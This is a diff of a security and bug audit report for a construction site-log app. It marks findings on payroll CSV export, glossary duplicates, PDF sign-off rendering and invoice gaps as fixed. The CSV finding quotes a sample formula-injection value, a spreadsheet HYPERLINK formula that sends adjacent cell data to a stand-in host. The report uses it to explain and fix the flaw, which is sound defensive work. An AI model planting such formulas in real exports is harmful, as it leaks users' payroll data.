 - **Problem:** With 'Has weather delay' on and 120 matching reports, the hint shows only page 1's hours, a different number on each page, and understates the evidence-pack total the user is about to build.
 - **Fix:** The suggested fix works. A concrete version: add a SQL RPC that takes the same filters and returns `sum(lost_hours)` over current_weather joined to the filtered reports, and call it alongside the paged query. An alternative without a migration: run `reportArchiveQuery(filters)` a second time with `.select('id')` and no `.range()`, then sum `current_weather.lost_hours` with `.in('report_id', allIds)`. PostgREST's default max-rows limit (usually 1000) also caps this route, so it still undercounts very large sets. The RPC is the robust fix. If neither is done, relabel the hint so it says it covers this page only.
@@ -872,7 +916,7 @@ Fix the critical and high items before real customer data (other organisations, 
 
 ### Payroll CSV does not neutralise spreadsheet formulas in company and site names
 
-`supabase/functions/api-export-payroll/csv.ts:51` · security/csv · Confirmed 3/3
+`supabase/functions/api-export-payroll/csv.ts:51` · security/csv · Confirmed 3/3 · **Fixed (W3-06):** `csvCell` (`packages/shared/src/report/payroll.ts`) prefixes a text cell that starts with `=`, `+`, `-`, `@`, tab or CR with `'`, numbers stay plain; api-export-payroll's `csvEscape` and the demo CSV use it (Deno tests in `csv_test.ts`, unit tests in `payroll.test.ts`).
 
 - **Problem:** An unknown company is captured as '=HYPERLINK("https://x.example/?"&A2,"Pay")'. The accounts user opens payroll_2026-W41.csv in Excel and the cell renders as a live formula or link built from adjacent payroll data.
 - **Fix:** The suggested fix is right. Apply it only to string inputs, so that numeric cells like workers and version stay plain numbers. In csvEscape, after the null check, set `let s = String(value); if (typeof value === 'string' && /^[=+\-@\t\r]/.test(s)) s = "'" + s;`, then apply the existing RFC 4180 quoting to s. Add Deno tests for `=HYPERLINK(...)`, `+1`, `-1` and `@SUM(...)`, and one checking that a value like `Delta, Inc` is still only quoted.
@@ -942,7 +986,7 @@ Fix the critical and high items before real customer data (other organisations, 
 
 ### resolve_unknown_company adds a duplicate glossary row on every resolve (`on conflict do nothing` can never fire)
 
-`supabase/migrations/20261011000005_rpcs.sql:230` · constraint · Unverified
+`supabase/migrations/20261011000005_rpcs.sql:230` · constraint · Unverified · **Fixed (W3-08):** `20261016000290_glossary_rpcs.sql` replaces `resolve_unknown_company()` in place: it updates the org's company rows for the name and inserts only when none matched (`supabase/db-tests/src/glossary.test.ts`). Rows the old function duplicated stay until the owner approves a cleanup.
 
 - **Problem:** Reproduced on PGlite. The org already has an auto-learned 'Ridgeway' company term. After resolve_unknown_company(…, 'Ridgeway', 'map', Apex) it has two identical confirmed 'Ridgeway → Apex Concrete' rows, and each further resolve adds another. The Glossary page lists duplicates, and listGlossary feeds both into the transcription and extraction prompts.
 - **Fix:** Update the existing row first and insert only when no row matched (`if not found then insert`), mirroring the worker's upsertGlossaryTerm. Alternatively, add a unique index on (org_id, lower(heard), kind, coalesce(scope_site_id, …)) and use a real ON CONFLICT.
@@ -963,14 +1007,14 @@ Fix the critical and high items before real customer data (other organisations, 
 
 ### sign_off_report / undo_sign_off never re-render the PDF, so stored PDFs never show the sign-off
 
-`supabase/migrations/20261011000005_rpcs.sql:172` · rpc-logic · Unverified
+`supabase/migrations/20261011000005_rpcs.sql:172` · rpc-logic · Unverified · Closed in W1-14 (see "Daily report PDF never shows 'Signed off in SiteLog by {name}'")
 
 - **Problem:** A PM signs off OM-1187-0133 v1 and downloads the PDF from the report page. It still shows the blank 'Project manager signature' line and no 'Signed off in SiteLog by …', so the signed-off record handed to an owner or a claim does not carry the sign-off.
 - **Fix:** In sign_off_report (and undo_sign_off), enqueue_job('render_pdf', {reportId, version: r.current_version, emailRecipients:false}, null, 'render_pdf:'||id||':'||version||':signoff:'||extract(epoch from now())).
 
 ### invoice_gaps compares each invoice with reported hours for the query window, not the invoice's own period, and repeats the company total for every invoice
 
-`supabase/migrations/20261011000005_rpcs.sql:307` · wrong-result · Unverified
+`supabase/migrations/20261011000005_rpcs.sql:307` · wrong-result · Unverified · **Fixed (W3-06):** `20261016000270_invoice_gap_notice.sql` compares each invoice with the reports of its own period (a lateral sum over `current_manpower`).
 
 - **Problem:** Reproduced on PGlite. Adding a second Apex invoice for Oct 8–9 (24 h) to the seed makes invoice_gaps(org, '2026-10-05','2026-10-09') return Apex twice: gap 0 for the weekly invoice and gap −448 for the two-day one. A one-day query invoice_gaps(org,'2026-10-09','2026-10-09') reports Apex +368 h and Ironclad +184 h, because the whole weekly invoice is compared with one day of reports.
 - **Fix:** Compute reported hours per invoice: `left join lateral (select sum(hours) from current_manpower cm where cm.company_id = i.company_id and cm.date between i.period_start and i.period_end) r on true`.
